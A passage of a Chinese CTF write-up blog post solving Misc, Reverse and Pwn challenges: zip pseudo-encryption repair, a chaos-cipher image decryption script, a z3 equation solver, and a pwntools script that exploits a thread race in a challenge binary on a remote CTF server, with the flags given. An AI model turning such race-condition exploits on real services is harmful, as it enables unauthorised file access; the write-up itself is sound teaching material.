+<p><img src="http://cdn.anyiblog.top/common/1666263115151-b6ca20f3-b751-4204-914f-dd3b32eb5f3e.jpg"><br>等这个密钥搜索完，直接取消就好 不知道是什么原因ARCHPR并不能直接显示密码，不过可以将恢复好的压缩包导出</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263115623-a1642ca9-7910-4276-ae7c-2743357861de.jpg"><br>解压secret.zip</p>
+<p><strong>第五层：</strong></p>
+<p><img src="http://cdn.anyiblog.top/common/1666263116041-0694c0b8-749d-487c-adde-3f1b6ee90c5f.jpg"><br>这个secret.jpg当时没看hint还分析了很久，结果跟这个图片没有任何关系，</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263116437-3079b37f-f15a-40b8-b5a7-5c9a35f75ee6.jpg"><br>恶趣味罢了呜呜呜</p>
+<p>最后一层根据提示，猜测伪加密，可以手工修</p>
+<p>这里用的zipcenop修复（这工具终于修复成功一次了！）</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263116875-de0c58ee-fa63-49a3-9e7b-a1d8643c197d.jpg"><br><img src="http://cdn.anyiblog.top/common/1666263117302-887fd307-efab-4ba6-94e0-032dd3b1e990.jpg"><br>打开文本得到flag：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263117690-394d5c9b-aba8-4795-8156-b6cd50a710f1.jpg"><br>Flag：flag{I_r3ally_Want_tO_be_1I1I1}</p>
+<h3 id="Misc5-混沌的图像"><a href="#Misc5-混沌的图像" class="headerlink" title="Misc5.混沌的图像"></a>Misc5.混沌的图像</h3><p><img src="http://cdn.anyiblog.top/common/1666263118047-be9f96d8-93e3-4e66-9317-9707f9da1bdf.jpg"><br>这道题跟week1 密码学chaos那题有联系，还没看过可以看我的博客：<a href="https://www.anyiblog.top/2022/09/25/20220925/#Crypto5-chaos">https://www.anyiblog.top/2022/09/25/20220925/#Crypto5-chaos</a></p>
+<p>提示是一段base，解密结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">img = Image.open(&#x27;flag.png&#x27;)</span><br><span class="line">w,h=img.size</span><br><span class="line">for i in range(w):</span><br><span class="line">    for j in range(h):</span><br><span class="line">    (r, g, b, a) = img.getpixel((i,j))</span><br><span class="line">    pic.append(r)</span><br><span class="line">    pic.append(g)</span><br><span class="line">    pic.append(b)</span><br></pre></td></tr></table></figure>
+<p>附件是一张图片</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263123950-1e03f521-2e3d-4e37-afdd-2faeec758188.jpg"><br>图片存在lsb隐写，stegsolve分析：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263124501-624f8d00-85d7-44f2-a9fa-6f81e87f789c.jpg"><br>存在另一张图片。用save bin保存至新的文件</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263134232-b11c6e5b-4859-4384-89b7-4fab420db9d6.jpg"><br>得到这张图片,同时winhex再搜索图片尾AE4260看看有没有其他数据：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263135077-df86c516-7c62-48cf-8810-e7798fc37d92.jpg"><br>发现了这个k1和k2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">k1=3.5606267076894413,k2=3.9101741242346346,k=[106,80,198,220,47,18,19,230,42,202,207,196,214,132,188,190]</span><br></pre></td></tr></table></figure>
+<p>之前的chaos.py：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263135497-ca25ea08-495f-4809-9560-e9d594a37ee4.jpg"><br>之前的给了k1,k2,k还有c，然后让我们还原flag</p>
+<p>现在只有k1,k2还有k 没有了c。</p>
+<p>给的hint的加密脚本还有和之前密码学chaos那道题联系之后，二者加密得到了上面这张图片</p>
+<p>刚开始逻辑还是有点不明白，问了下出题师傅</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263135852-e561f184-d27c-445c-abb3-4c1b0165d447.jpg">师傅这么说了，所以说c就是这张图片，准确来说就是hint的那个脚本的pic变量。</p>
+<p>因此我们需要提取这张图片的每个像素的R&#x2F;G&#x2F;B值，然后添加到列表c，再通过之前chaos的解密脚本还原flag，此时这个flag是一堆数字的列表 也就是新图片的R&#x2F;G&#x2F;B值，对照还原即可！</p>
+<p>不同的地方就是之前那个解密脚本我写的是把列表中所有的数字当作ascii处理 还原flag，然后这次我刚开始写的时候也是这么做的哈哈，导致了写出来的文本一堆乱码 看不懂。<br><img src="http://cdn.anyiblog.top/common/1666263136324-bf34bd71-4b0e-48f9-a8b8-ccf8b73ad687.jpg"><br>也算是深有体会了！第二天早上想到是R&#x2F;G&#x2F;B值 写到新图片就还原了。</p>
+<p>这边直接贴脚本，需要注意的是提取像素和写像素这两个地方，也就是脚本的开始和末尾的地方，中间的和之前一样不变 照抄就可以了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">img = Image.open(&#x27;task.png&#x27;)</span><br><span class="line">c = []</span><br><span class="line">w,h=img.size</span><br><span class="line">for i in range(w):</span><br><span class="line">    for j in range(h):</span><br><span class="line">        (r, g, b) = img.getpixel((i,j))</span><br><span class="line">        c.append(r)</span><br><span class="line">        c.append(g)</span><br><span class="line">        c.append(b)</span><br><span class="line">print(len(c))</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">sum, r, k = 0, 1, [106,80,198,220,47,18,19,230,42,202,207,196,214,132,188,190]</span><br><span class="line">k1=3.5606267076894413</span><br><span class="line">k2=3.9101741242346346</span><br><span class="line">for i in k:</span><br><span class="line">    sum += i</span><br><span class="line">    r ^= i</span><br><span class="line">a_1 = (sum/256) % 1</span><br><span class="line">timea1 = 3 + int(1000 * a_1) % 30</span><br><span class="line">b_1 = (r/256)</span><br><span class="line">timeb1 = 3 + int(1000 * b_1) % 30</span><br><span class="line">xc_1 = a_1 * b_1</span><br><span class="line">yc_1 = (a_1 + b_1) % 1</span><br><span class="line">data = (a_1, timea1, b_1, timeb1, xc_1, yc_1)</span><br><span class="line">key = (k1,k2)</span><br><span class="line">def LC(key, x, times, flags):</span><br><span class="line">    (k1, k2) = key</span><br><span class="line">    xn = []</span><br><span class="line">    xn.append(x)</span><br><span class="line">    if flags:</span><br><span class="line">        xn.append(1 - 2 * xn[0]**2)</span><br><span class="line">    else:</span><br><span class="line">        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])</span><br><span class="line">    for i in range(times):</span><br><span class="line">        assert xn[i]&gt;=-1 and xn[i]&lt;=1 and xn[i+1]&gt;=-1 and xn[i+1]&lt;=1</span><br><span class="line">        if flags:</span><br><span class="line">            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))</span><br><span class="line">        else:</span><br><span class="line">            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))</span><br><span class="line">    return xn[times + 1]</span><br><span class="line">m, c = [], c</span><br><span class="line">miu, omiga = [], []</span><br><span class="line">ta = timea1</span><br><span class="line">tb = timeb1</span><br><span class="line">res = []</span><br><span class="line">for flag in c:</span><br><span class="line">    miu.append(LC(key, a_1, ta, 1))</span><br><span class="line">    omiga.append(LC(key, b_1, tb, 0))</span><br><span class="line">    res.append(((int(miu[-1] * 1000) + int(omiga[-1] * 1000))%256)^flag)</span><br><span class="line">    delta = flag/256</span><br><span class="line">    for i in range(3):</span><br><span class="line">        y = (yc_1 + delta) % 1</span><br><span class="line">        y = k1 * y**3 + (1 - k1) * y</span><br><span class="line">        x = xc_1</span><br><span class="line">        x = k2 * x**3 + (1 - k2) * x</span><br><span class="line">    ta = 3 + int(1000 * x) % 30</span><br><span class="line">    tb = 3 + int(1000 * y) % 30</span><br><span class="line">  </span><br><span class="line">#print(len(res),res[0],res[1],res[2])</span><br><span class="line">n = Image.new(&#x27;RGB&#x27;,(w,h))</span><br><span class="line">for i in range(w):</span><br><span class="line">    for j in range(h):</span><br><span class="line">        #print(i*30 + j*3,i*30 + j*3+1,i*30 + j*3+2)</span><br><span class="line">        n.putpixel((i,j),(res[i*(h*3) + j*3],res[i*(h*3) + j*3+1],res[i*(h*3) + j*3+2]))</span><br><span class="line">n.save(&#x27;result.png&#x27;)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">f = b&quot;&quot;</span><br><span class="line">for i in res:</span><br><span class="line">    f += chr(i).encode()</span><br><span class="line">#print(len(f))</span><br><span class="line">with open(&#x27;new2.txt&#x27;,&#x27;wb&#x27;) as n:</span><br><span class="line">    n.write(f)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<p>运行脚本后等待一会，得到result.png</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263144025-06facf12-1547-43d5-9856-f55bb6317297.jpg"><br>最后lsb隐写，stegsolve提取得到flag。</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263144501-c6d47b6e-4e86-4016-bf88-26ecc6d2e622.jpg"><br>Flag：flag{easy_chaos_encrypt!!!_776e6d30}</p>
+<p>小彩蛋？</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263144863-f4232baf-18ab-464b-b0bc-2efb904c6375.jpg">  </p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="Reverse1-Zzzzzz3333"><a href="#Reverse1-Zzzzzz3333" class="headerlink" title="Reverse1.Zzzzzz3333"></a>Reverse1.Zzzzzz3333</h3><p>32位，无壳。IDA分析：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263145355-c01fb9d1-bf38-49e8-add7-d38557a6b0b3.jpg"><br>告诉了我们一堆方程让我们解密arglist，然后得到arglist后带到加密程序得到flag。</p>
+<p>byte_602168：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263145771-d8672d46-5696-4cb4-8510-13bfc9a9c7c2.jpg"><br>用到了python的z3库，刚好前些时间台州赛有一题也是用z3库解密，刚好会做。</p>
+<p>这个z3库只要是为了帮助解密方程式，像这种多个式子的就可以拿来解密</p>
+<p>需要注意的是这一块：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263146173-207f2ab1-e479-4bec-bf29-1105f80bb432.jpg"><br>这边是一个变量自乘，不是方程式里的内容，不要将这一个写进去 会报错。</p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">Arglist = []</span><br><span class="line">for i in range(8):</span><br><span class="line">    Arglist.append(BitVec(&quot;Arglist%d&quot;%i,8))</span><br><span class="line">sol = Solver()</span><br><span class="line">v13 = Arglist[5]</span><br><span class="line">v11 = Arglist[4]</span><br><span class="line">v9 = Arglist[1]</span><br><span class="line">v12 = Arglist[3]</span><br><span class="line">v8 = Arglist[7]</span><br><span class="line">v10 = Arglist[0]</span><br><span class="line">sol.add(Arglist[3]+ 4 * Arglist[2]+ Arglist[7]+ 4 * (Arglist[3] + 4 * Arglist[2])+ 3 * (Arglist[4] + 4 * Arglist[0])+ 2 * (Arglist[5] + 4 * Arglist[6]) + 11 * Arglist[1] == 6426)</span><br><span class="line">sol.add(11 * (v10 + v8 + v12) + 4 * (v13 + 2 * v11) + Arglist[2] + 45 * v9 + 7 * Arglist[6] == 9801)</span><br><span class="line">sol.add(5 * v9 + 2 * (v11 + Arglist[6] + v13 + 2 * (v8 + v12) + Arglist[2] + 2 * (Arglist[6] + v13 + 2 * (v8 + v12)) + 8 * v10) == 6021)</span><br><span class="line">sol.add(19 * v10 + 9 * v9 + 67 * v8 + 5 * (Arglist[2] + Arglist[6]) + 7 * (v13 + 4 * v12) + 4 * v11 == 14444)</span><br><span class="line">sol.add(22 * v13 + 5 * (v11 + 2 * (v12 + v9 + 2 * v10)) + 4 * (v8 + Arglist[6]) + 6 * Arglist[2] == 7251)</span><br><span class="line">sol.add(19 * v12 + 3 * (v8 + Arglist[2] + 4 * v8 + Arglist[6] + 2 * (v8 + Arglist[2] + 4 * v8)) + 4 * (v10 + v13 + v9 + 2 * (v10 + v13)) == 10054)</span><br><span class="line">v9 *= 2</span><br><span class="line">sol.add(7 * v10 + 17 * (v12 + v9) + 11 * (v11 + 2 * v13) + 2 * (Arglist[2] + Arglist[6] + 4 * Arglist[2] + 6 * v8) == 10735)</span><br><span class="line">sol.add(Arglist[6] + v11 + 11 * Arglist[2] + 15 * (v12 + 2 * v8) + v9 + 43 * v10 + 21 * v13 == 11646)</span><br><span class="line">assert sat == sol.check()</span><br><span class="line">ans = sol.model()</span><br><span class="line">res = &quot;&quot;</span><br><span class="line">for i in Arglist:</span><br><span class="line">    res += chr(int(str(ans[i])))</span><br><span class="line">print(res)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">flag = [0,0x0d,0x0d,0x0b,0x0c,0x6b,0x14,0x1e,0x1c,0x52,0x5f,0x5f,0x28,0x78,0x1d,0x3b,0x25,0x0e,3,0,0x56,0x10,0x4f,0x19]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">for i in range(24):</span><br><span class="line">    flag[i] = flag[i] &amp; (ord(res[i &amp; 7]) ^ flag[i]) | ~flag[i] &amp; (~flag[i] ^ ~ord(res[i &amp; 7]))</span><br><span class="line">f = &quot;&quot;</span><br><span class="line">for i in flag:</span><br><span class="line">    f += chr(i)</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1666263146548-3c84cb6a-a75d-4afe-8c9c-f881e5730294.jpg"><br>或者直接把key带到程序里：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263146897-0c2a8fe5-aa5a-4a45-9ceb-0d84442b6d7c.jpg">Flag：flag{Zzzz333_Is_Cool!!!}</p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="Pwn1-cat-flag"><a href="#Pwn1-cat-flag" class="headerlink" title="Pwn1.cat flag"></a>Pwn1.cat flag</h3><p>64位菜单题，多线程加sleep函数导致的漏洞</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263147310-087b8ebd-f9d4-424d-8fde-099bd24e87cc.jpg">  </p>
+<p>ls可以看当前目录文件 cat读取文件 editname修改name</p>
+<p>跟进cat</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263147673-233291b5-f5a2-48d5-9c01-767f66bb372c.jpg"><br>如果文件存在且符合条件则执行cating函数，跟进</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263148010-edd1ac05-d475-43ff-b0e5-6ac38424fcd5.jpg"><br>这个函数就是执行cat的主要函数，这里的sleep(1)按理来说程序到这里不能执行其他的命令，但由于是用线程执行 所以会导致这个sleep time在后台等待，那么在这个1s的期间就可以用edit函数功能修改name为flag，导致strcat(dest,name)原先的name变量替换成mv函数输入的东西 从而获得flag。</p>
+<p>（如果手够快，光输入就可以得到flag）</p>
+<p>所以首先要先cat一个存在的文件，引进到cating函数。用ls看一下</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263148432-a97daa7c-1e45-40b7-b386-e3149db61c7c.jpg"><br>任意选一个，这里我用backdoor。</p>
+<p>选择cat后输入backdoor，然后立刻选择mv功能输入flag</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263148850-bf1c143e-35b8-4f8c-838f-72425a3d12c3.jpg"><br>同样贴下脚本吧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25420)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def ls():</span><br><span class="line">    p.sendlineafter(&#x27;==&gt;&#x27;,&#x27;1&#x27;)</span><br><span class="line">    print(p.recv())</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def cat(filename):</span><br><span class="line">    p.sendlineafter(&#x27;==&gt;&#x27;,&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;cat.&#x27;,str(filename))</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def mv(filename):</span><br><span class="line">    p.sendlineafter(&#x27;==&gt;&#x27;,&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;change.&#x27;,str(filename))</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">cat(&#x27;backdoor&#x27;)</span><br><span class="line">mv(&#x27;flag&#x27;)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br><span class="line">  </span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Anyyy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.anyiblog.top/2022/10/20/20221020/">http://www.anyiblog.top/2022/10/20/20221020/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.anyiblog.top" target="_blank">Anyyy安全小站</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%88%B7%E9%A2%98/">刷题</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="http://cdn.anyiblog.top/common/6EE5B4DA1158A8922B7B29B21381BECF.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://fastly.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/23/20221023/"><img class="prev-cover" src="http://cdn.anyiblog.top/common/6EE5B4DA1158A8922B7B29B21381BECF.jpg" onerror="onerror=null;src='http://cdn.anyiblog.top/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NewStarCTF 公开赛第五周-收官周Writeup</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/15/20221015/"><img class="next-cover" src="http://cdn.anyiblog.top/common/6EE5B4DA1158A8922B7B29B21381BECF.jpg" onerror="onerror=null;src='http://cdn.anyiblog.top/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NewStarCTF 公开赛第二周Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/10/14/20211014/" title="记一次文件上传之过滤php绕过"><img class="cover" src="http://cdn.anyiblog.top/common/1646392513625-fd6edaab-3c57-4c79-a544-7de27fa9d2ac.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-14</div><div class="title">记一次文件上传之过滤php绕过</div></div></a></div><div><a href="/2021/12/04/20211204/" title="摸鱼大闯关 1-40关 writeup"><img class="cover" src="http://cdn.anyiblog.top/common/1646392613793-f9da8870-2a98-448e-b729-eaed11bfcd2a.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-04</div><div class="title">摸鱼大闯关 1-40关 writeup</div></div></a></div><div><a href="/2021/12/08/20211208/" title="融贯杯 writeup"><img class="cover" src="http://cdn.anyiblog.top/common/1646392643413-f46fa0e1-6d44-4bd9-aa1f-bae80409d3f8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-08</div><div class="title">融贯杯 writeup</div></div></a></div><div><a href="/2022/03/05/20220305/" title="Bugku S2收官赛AWD解析&如何打AWD?"><img class="cover" src="http://cdn.anyiblog.top/common/1646483574333-968635ed-5a8c-425a-bb24-5552a5e97fa5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-05</div><div class="title">Bugku S2收官赛AWD解析&如何打AWD?</div></div></a></div><div><a href="/2022/01/09/20220109/" title="2022长安战"疫"WriteUp"><img class="cover" src="http://cdn.anyiblog.top/common/1646392676713-e6fe8060-5ed5-47d6-b53d-7a7ac2e19530.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-09</div><div class="title">2022长安战"疫"WriteUp</div></div></a></div><div><a href="/2022/04/20/20220420/" title="记2022Xctf web-WriteUp"><img class="cover" src="http://cdn.anyiblog.top/common/1650422131077-48517457-7d0e-40e4-ae4f-4810291233d6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-20</div><div class="title">记2022Xctf web-WriteUp</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://cdn.anyiblog.top/img/avatar.jpg" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Anyyy</div><div class="author-info__description">电影落幕，月亮隐没，我会忘记你。</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/120264656/"><i class="fab fa-bilibili"></i><span>Bilibili</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1395980247&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://cdn.anyiblog.top/img/wechat.jpg" target="_blank" title="Wechat"><i class="fab fa-weixin"></i></a><a class="social-icon" href="mailto:anyiguys@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">☁️欢迎造访安逸的网安小站☁️<br>⭐不定期更新干货，建议收藏 以防走丢~⭐<br><span style='color: #f66e64'>👉图片无法加载请参考文章 <style>.inform{color: #49B1F5} .inform:hover{color: #99a9bf}</style><a class='inform' href='https://www.anyiblog.top/inform/'>站点通知</a></span></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web1-BabySSTI-One"><span class="toc-number">2.0.1.</span> <span class="toc-text">Web1.BabySSTI_One</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web2-multiSQL"><span class="toc-number">2.0.2.</span> <span class="toc-text">Web2.multiSQL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc1-Whats-HTTP"><span class="toc-number">3.0.1.</span> <span class="toc-text">Misc1.Whats HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc2-qsdz%E2%80%99s-girlfriend-3"><span class="toc-number">3.0.2.</span> <span class="toc-text">Misc2.qsdz’s girlfriend 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc3-WebShell%EF%BC%81"><span class="toc-number">3.0.3.</span> <span class="toc-text">Misc3.WebShell！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc4-Yesec-no-drumsticks-3"><span class="toc-number">3.0.4.</span> <span class="toc-text">Misc4.Yesec no drumsticks 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc5-%E6%B7%B7%E6%B2%8C%E7%9A%84%E5%9B%BE%E5%83%8F"><span class="toc-number">3.0.5.</span> <span class="toc-text">Misc5.混沌的图像</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse1-Zzzzzz3333"><span class="toc-number">4.0.1.</span> <span class="toc-text">Reverse1.Zzzzzz3333</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn1-cat-flag"><span class="toc-number">5.0.1.</span> <span class="toc-text">Pwn1.cat flag</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/18/20240818/" title="eBSploit 永恒之蓝一键利用工具"><img src="https://cdn.anyiblog.top/product/ebsploit/cover/header.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="eBSploit 永恒之蓝一键利用工具"/></a><div class="content"><a class="title" href="/2024/08/18/20240818/" title="eBSploit 永恒之蓝一键利用工具">eBSploit 永恒之蓝一键利用工具</a><time datetime="2024-08-17T16:00:00.000Z" title="发表于 2024-08-18 00:00:00">2024-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/01/20240601/" title="案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~"><img src="http://cdn.anyiblog.top/WriteUp/20240601/cover.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~"/></a><div class="content"><a class="title" href="/2024/06/01/20240601/" title="案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~">案例分享 | 记一次对大型国企Ruoyi系统曲折的打点测试But lucky~</a><time datetime="2024-05-31T16:00:00.000Z" title="发表于 2024-06-01 00:00:00">2024-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/14/20240314/" title="中职网络安全赛项-B模块综合详细题解"><img src="http://cdn.anyiblog.top/WriteUp/20240314/cover.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="中职网络安全赛项-B模块综合详细题解"/></a><div class="content"><a class="title" href="/2024/03/14/20240314/" title="中职网络安全赛项-B模块综合详细题解">中职网络安全赛项-B模块综合详细题解</a><time datetime="2024-03-13T16:00:00.000Z" title="发表于 2024-03-14 00:00:00">2024-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/09/20231209/" title="第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up"><img src="http://cdn.anyiblog.top/WriteUp/20231209/cover.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up"/></a><div class="content"><a class="title" href="/2023/12/09/20231209/" title="第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up">第六届强网拟态国际精英挑战赛线下 白盒资格赛 Misc方向Write Up</a><time datetime="2023-12-08T16:00:00.000Z" title="发表于 2023-12-09 00:00:00">2023-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/11/20230611/" title="SYCTF2023 安洵杯全国精英赛 | Misc方向题解"><img src="http://cdn.anyiblog.top//common/202306110947345.png" onerror="this.onerror=null;this.src='http://cdn.anyiblog.top/img/404.jpg'" alt="SYCTF2023 安洵杯全国精英赛 | Misc方向题解"/></a><div class="content"><a class="title" href="/2023/06/11/20230611/" title="SYCTF2023 安洵杯全国精英赛 | Misc方向题解">SYCTF2023 安洵杯全国精英赛 | Misc方向题解</a><time datetime="2023-06-11T00:38:26.360Z" title="发表于 2023-06-11 08:38:26">2023-06-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By Anyyy</div><div class="icp"><a href="https://beian.miit.gov.cn/" target="_blank"><img class="lozad" style="padding:0px;vertical-align: text-bottom;" src="http://cdn.anyiblog.top/img/beian.png"/><span>浙ICP备2023010983号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas 